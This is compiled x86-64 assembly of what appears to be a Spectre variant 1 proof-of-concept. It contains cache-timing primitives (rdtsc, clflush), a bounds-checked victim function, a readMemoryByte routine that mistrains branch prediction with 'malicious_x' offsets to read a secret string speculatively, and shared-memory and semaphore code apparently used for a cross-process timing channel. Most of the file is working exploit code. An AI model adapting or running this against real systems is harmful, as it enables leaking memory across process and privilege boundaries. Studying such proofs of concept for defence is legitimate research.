	.file	"Source.c"
	.text
	.globl	rdtsc_nofence
	.type	rdtsc_nofence, @function
rdtsc_nofence:
.LFB0:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 11 "cacheutils.h" 1
	rdtsc
# 0 "" 2
#NO_APP
	movq	%rax, -16(%rbp)
	movq	%rdx, -8(%rbp)
	movq	-8(%rbp), %rax
	salq	$32, %rax
	orq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	rdtsc_nofence, .-rdtsc_nofence
	.globl	rdtsc
	.type	rdtsc, @function
rdtsc:
.LFB1:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 18 "cacheutils.h" 1
	mfence
# 0 "" 2
# 19 "cacheutils.h" 1
	rdtsc
# 0 "" 2
#NO_APP
	movq	%rax, -16(%rbp)
	movq	%rdx, -8(%rbp)
	movq	-8(%rbp), %rax
	salq	$32, %rax
	orq	%rax, -16(%rbp)
#APP
# 21 "cacheutils.h" 1
	mfence
# 0 "" 2
#NO_APP
	movq	-16(%rbp), %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE1:
	.size	rdtsc, .-rdtsc
	.globl	rdtsc_begin
	.type	rdtsc_begin, @function
rdtsc_begin:
.LFB2:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	.cfi_offset 3, -24
#APP
# 27 "cacheutils.h" 1
	mfence
	CPUID
	RDTSCP
	mov %rdx, %rdi
	mov %rax, %rsi
	mfence
	
# 0 "" 2
#NO_APP
	movq	%rdi, -24(%rbp)
	movq	%rsi, -16(%rbp)
	movq	-24(%rbp), %rax
	salq	$32, %rax
	orq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE2:
	.size	rdtsc_begin, .-rdtsc_begin
	.globl	rdtsc_end
	.type	rdtsc_end, @function
rdtsc_end:
.LFB3:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	.cfi_offset 3, -24
#APP
# 42 "cacheutils.h" 1
	mfence
	RDTSCP
	mov %rdx, %rdi
	mov %rax, %rsi
	CPUID
	mfence
	
# 0 "" 2
#NO_APP
	movq	%rdi, -24(%rbp)
	movq	%rsi, -16(%rbp)
	movq	-24(%rbp), %rax
	salq	$32, %rax
	orq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3:
	.size	rdtsc_end, .-rdtsc_end
	.globl	maccess
	.type	maccess, @function
maccess:
.LFB4:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdx
	movq	%rdx, %rcx
#APP
# 57 "cacheutils.h" 1
	movq (%rcx), %rax

# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4:
	.size	maccess, .-maccess
	.globl	flush
	.type	flush, @function
flush:
.LFB5:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdx
	movq	%rdx, %rcx
#APP
# 64 "cacheutils.h" 1
	clflush 0(%rcx)

# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE5:
	.size	flush, .-flush
	.globl	prefetch
	.type	prefetch, @function
prefetch:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
#APP
# 72 "cacheutils.h" 1
	prefetcht1 -8(%rbp)
# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	prefetch, .-prefetch
	.globl	longnop
	.type	longnop, @function
longnop:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 77 "cacheutils.h" 1
	nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	longnop, .-longnop
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.comm	unused1,64,32
	.globl	array1
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"ahe Msadasare Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	num
	.align 4
	.type	num, @object
	.size	num, 4
num:
	.zero	4
	.comm	sem_union,8,8
	.local	sem_id
	.comm	sem_id,4,4
	.local	shm
	.comm	shm,8,8
	.text
	.type	semaphore_v, @function
semaphore_v:
.LFB4270:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movw	$0, -14(%rbp)
	movw	$1, -12(%rbp)
	movw	$4096, -10(%rbp)
	movl	sem_id(%rip), %eax
	leaq	-14(%rbp), %rcx
	movl	$1, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	semop@PLT
	cmpl	$-1, %eax
	jne	.L14
	movl	$-1, %eax
	jmp	.L16
.L14:
	movl	$0, %eax
.L16:
	movq	-8(%rbp), %rdx
	xorq	%fs:40, %rdx
	je	.L17
	call	__stack_chk_fail@PLT
.L17:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4270:
	.size	semaphore_v, .-semaphore_v
	.type	semaphore_p, @function
semaphore_p:
.LFB4271:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movw	$0, -14(%rbp)
	movw	$-1, -12(%rbp)
	movw	$4096, -10(%rbp)
	movl	sem_id(%rip), %eax
	leaq	-14(%rbp), %rcx
	movl	$1, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	semop@PLT
	cmpl	$-1, %eax
	jne	.L19
	movl	$-1, %eax
	jmp	.L21
.L19:
	movl	$0, %eax
.L21:
	movq	-8(%rbp), %rdx
	xorq	%fs:40, %rdx
	je	.L22
	call	__stack_chk_fail@PLT
.L22:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4271:
	.size	semaphore_p, .-semaphore_p
	.type	semaphore_init, @function
semaphore_init:
.LFB4272:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$950, %edx
	movl	$0, %esi
	movl	$100, %edi
	call	semget@PLT
	movl	%eax, sem_id(%rip)
	movl	sem_id(%rip), %eax
	cmpl	$-1, %eax
	jne	.L24
	movl	$-1, %eax
	jmp	.L25
.L24:
	movl	$0, %eax
.L25:
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4272:
	.size	semaphore_init, .-semaphore_init
	.type	sharemmy_init, @function
sharemmy_init:
.LFB4273:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$950, %edx
	movl	$1532, %esi
	movl	$101, %edi
	call	shmget@PLT
	movl	%eax, -4(%rbp)
	cmpl	$-1, -4(%rbp)
	jne	.L27
	movl	-4(%rbp), %eax
	jmp	.L28
.L27:
	movl	-4(%rbp), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	call	shmat@PLT
	movq	%rax, shm(%rip)
	movq	shm(%rip), %rax
	cmpq	$-1, %rax
	jne	.L29
	movl	$-1, %eax
	jmp	.L28
.L29:
	movl	-4(%rbp), %eax
.L28:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4273:
	.size	sharemmy_init, .-sharemmy_init
	.type	sharemmy_destroy, @function
sharemmy_destroy:
.LFB4274:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	-32(%rbp), %rax
	movq	%rax, %rdi
	call	shmdt@PLT
	movl	%eax, -4(%rbp)
	cmpl	$-1, -4(%rbp)
	jne	.L31
	movl	-4(%rbp), %eax
	jmp	.L32
.L31:
	movl	$0, %eax
.L32:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4274:
	.size	sharemmy_destroy, .-sharemmy_destroy
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4275:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	cmpq	%rax, -8(%rbp)
	jnb	.L40
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$89, %al
	ja	.L35
	movl	$0, %eax
	jmp	.L36
	.align 32
.L37:
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx

	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx

	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx

	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	addl	$1, %ecx
	
	addl	$1, %eax
.L36:
	cmpl	$99, %eax
	jle	.L37
	jmp	.L40
.L35:
	movl	$0, %eax
	jmp	.L38
	.align 32
.L39:
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)

	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)

	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)

	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	nopw   %cs:0x123123(%rax,%rax,1)
	
	addl	$1, %eax
.L38:
	cmpl	$99, %eax
	jle	.L39
.L40:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4275:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4276:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	leaq	-7999488(%rsp), %r11
.LPSRL0:
	subq	$4096, %rsp
	orq	$0, (%rsp)
	cmpq	%r11, %rsp
	jne	.LPSRL0
	subq	$616, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -8000088(%rbp)
	movq	%rsi, -8000096(%rbp)
	movq	%rdx, -8000104(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -8000068(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -8000032(%rbp)
	movq	shm(%rip), %rax
	movq	%rax, -8000064(%rbp)
	movq	-8000064(%rbp), %rax
	movl	$8, (%rax)
	movq	-8000064(%rbp), %rax
	leaq	4(%rax), %rdx
	movq	-8000032(%rbp), %rax
	movq	%rax, (%rdx)
	movl	$0, %eax
	call	semaphore_v
	movl	$0, -8000076(%rbp)
	jmp	.L42
.L43:
	movl	-8000076(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.27657(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -8000076(%rbp)
.L42:
	cmpl	$255, -8000076(%rbp)
	jle	.L43
	movl	$40000, -8000080(%rbp)
	jmp	.L44
.L49:
	movq	-8000032(%rbp), %rax
	addq	$25000, %rax
	movq	%rax, -8000032(%rbp)
	movl	-8000080(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -8000056(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, %rbx
	jmp	.L45
.L46:
	movl	$0, %eax
	call	rdtsc
	movq	%rax, %rbx
.L45:
	movq	-8000032(%rbp), %rax
	cmpq	%rax, %rbx
	jb	.L46
	movl	$5, -8000072(%rbp)
	jmp	.L47
.L48:
	leaq	array1_size(%rip), %rax
	movq	%rax, -8000040(%rbp)
	movq	-8000040(%rbp), %rax
	clflush	(%rax)
	nop
	movl	-8000072(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movq	%rax, %rdx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -8000048(%rbp)
	movq	-8000048(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -8000048(%rbp)
	movq	-8000088(%rbp), %rax
	xorq	-8000056(%rbp), %rax
	andq	-8000048(%rbp), %rax
	xorq	-8000056(%rbp), %rax
	movq	%rax, -8000048(%rbp)
	movq	-8000048(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -8000072(%rbp)
.L47:
	cmpl	$0, -8000072(%rbp)
	jns	.L48
	subl	$1, -8000080(%rbp)
.L44:
	cmpl	$0, -8000080(%rbp)
	jg	.L49
	nop
	movq	-24(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L50
	call	__stack_chk_fail@PLT
.L50:
	addq	$8000104, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4276:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 8
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"cpu affinity set"
	.align 8
.LC3:
	.string	"get CPU affinity failue, ERROR:%s\n"
	.align 8
.LC4:
	.string	"this process %d of running processor: %d\n"
.LC5:
	.string	"Init a semaphore fail."
.LC6:
	.string	"Init a share memory fail."
.LC7:
	.string	"%p"
.LC8:
	.string	"%d"
	.align 8
.LC9:
	.string	"Trying malicious_x = %p, len = %d\n"
	.align 8
.LC10:
	.string	"Reading at malicious_x = %p... \n"
.LC11:
	.string	"target:%d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4277:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$208, %rsp
	movl	%edi, -196(%rbp)
	movq	%rsi, -208(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	secret(%rip), %rdx
	movq	secret(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -176(%rbp)
	movq	secret(%rip), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movl	%eax, -192(%rbp)
	leaq	.LC2(%rip), %rdi
	call	puts@PLT
	movl	$0, %edi
	call	set_cpu
	leaq	-144(%rbp), %rax
	movq	%rax, %rsi
	movl	$0, %eax
	movl	$16, %edx
	movq	%rsi, %rdi
	movq	%rdx, %rcx
	rep stosq
	leaq	-144(%rbp), %rax
	movq	%rax, %rdx
	movl	$128, %esi
	movl	$0, %edi
	call	sched_getaffinity@PLT
	cmpl	$-1, %eax
	jne	.L52
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L64
.L52:
	movl	$0, -188(%rbp)
	jmp	.L54
.L58:
	movl	-188(%rbp), %eax
	cltq
	movq	%rax, -160(%rbp)
	cmpq	$1023, -160(%rbp)
	ja	.L55
	movq	-160(%rbp), %rax
	shrq	$6, %rax
	leaq	0(,%rax,8), %rdx
	leaq	-144(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rdx
	movq	-160(%rbp), %rax
	andl	$63, %eax
	movl	%eax, %ecx
	shrq	%cl, %rdx
	movq	%rdx, %rax
	andl	$1, %eax
	testq	%rax, %rax
	je	.L55
	movl	$1, %eax
	jmp	.L56
.L55:
	movl	$0, %eax
.L56:
	testl	%eax, %eax
	je	.L57
	call	getpid@PLT
	movl	%eax, %ecx
	movl	-188(%rbp), %eax
	movl	%eax, %edx
	movl	%ecx, %esi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
.L57:
	addl	$1, -188(%rbp)
.L54:
	cmpl	$3, -188(%rbp)
	jle	.L58
	movl	$0, %eax
	call	semaphore_init
	movl	%eax, -184(%rbp)
	cmpl	$0, -184(%rbp)
	jns	.L59
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	movl	$0, %eax
	jmp	.L64
.L59:
	call	sharemmy_init
	movl	%eax, -180(%rbp)
	cmpl	$-1, -180(%rbp)
	jne	.L60
	leaq	.LC6(%rip), %rdi
	call	puts@PLT
	movl	$0, %eax
	jmp	.L64
.L60:
	movq	$0, -168(%rbp)
	jmp	.L61
.L62:
	leaq	array2(%rip), %rdx
	movq	-168(%rbp), %rax
	addq	%rdx, %rax
	movb	$1, (%rax)
	addq	$1, -168(%rbp)
.L61:
	cmpq	$131071, -168(%rbp)
	jbe	.L62
	cmpl	$3, -196(%rbp)
	jne	.L63
	movq	-208(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-176(%rbp), %rdx
	leaq	.LC7(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-176(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -176(%rbp)
	movq	-208(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-192(%rbp), %rdx
	leaq	.LC8(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	-192(%rbp), %eax
	movq	-176(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC9(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
.L63:
	movq	-176(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-176(%rbp), %rax
	leaq	array1(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC11(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-176(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -176(%rbp)
	leaq	-152(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	$0, %eax
.L64:
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L65
	call	__stack_chk_fail@PLT
.L65:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4277:
	.size	main, .-main
	.section	.rodata
	.align 8
.LC12:
	.string	"warning: could not set CPU affinity/n"
	.text
	.globl	set_cpu
	.type	set_cpu, @function
set_cpu:
.LFB4278:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$176, %rsp
	movl	%edi, -164(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	leaq	-144(%rbp), %rax
	movq	%rax, %rsi
	movl	$0, %eax
	movl	$16, %edx
	movq	%rsi, %rdi
	movq	%rdx, %rcx
	rep stosq
	movl	-164(%rbp), %eax
	cltq
	movq	%rax, -152(%rbp)
	cmpq	$1023, -152(%rbp)
	ja	.L68
	movq	-152(%rbp), %rax
	shrq	$6, %rax
	leaq	0(,%rax,8), %rdx
	leaq	-144(%rbp), %rcx
	addq	%rcx, %rdx
	movq	(%rdx), %rdx
	movq	-152(%rbp), %rcx
	andl	$63, %ecx
	movl	$1, %esi
	salq	%cl, %rsi
	movq	%rsi, %rcx
	leaq	0(,%rax,8), %rsi
	leaq	-144(%rbp), %rax
	addq	%rsi, %rax
	orq	%rcx, %rdx
	movq	%rdx, (%rax)
.L68:
	leaq	-144(%rbp), %rax
	movq	%rax, %rdx
	movl	$128, %esi
	movl	$0, %edi
	call	sched_setaffinity@PLT
	cmpl	$-1, %eax
	jne	.L71
	movq	stderr(%rip), %rax
	movq	%rax, %rcx
	movl	$37, %edx
	movl	$1, %esi
	leaq	.LC12(%rip), %rdi
	call	fwrite@PLT
.L71:
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L70
	call	__stack_chk_fail@PLT
.L70:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4278:
	.size	set_cpu, .-set_cpu
	.local	results.27657
	.comm	results.27657,1024,32
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
